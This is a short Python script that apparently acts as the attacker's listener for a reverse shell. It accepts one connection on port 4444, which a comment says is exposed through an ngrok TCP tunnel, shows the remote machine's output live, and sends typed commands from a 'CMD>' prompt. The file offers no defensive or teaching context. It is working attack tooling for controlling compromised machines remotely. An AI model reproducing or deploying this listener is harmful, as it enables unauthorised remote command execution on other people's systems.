import socket
import threading

HOST = ''      # Listen on all interfaces
PORT = 4444    # Must match ngrok TCP target port

def handle_client(conn, addr):
    print(f"[+] Connection from {addr}")

    def receive():
        while True:
            try:
                data = conn.recv(4096)
                if not data:
                    break
                print(data.decode(), end='')  # print live output
            except:
                break

    threading.Thread(target=receive, daemon=True).start()

    try:
        while True:
            cmd = input("CMD> ")
            if cmd.lower() in ['exit', 'quit']:
                conn.send(b'exit\n')
                break
            conn.send((cmd + "\n").encode())
    except KeyboardInterrupt:
        print("\n[!] Closing connection.")
    finally:
        conn.close()


with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((HOST, PORT))
    s.listen(1)
    print(f"[*] Listening on port {PORT}...")
    conn, addr = s.accept()
    handle_client(conn, addr)

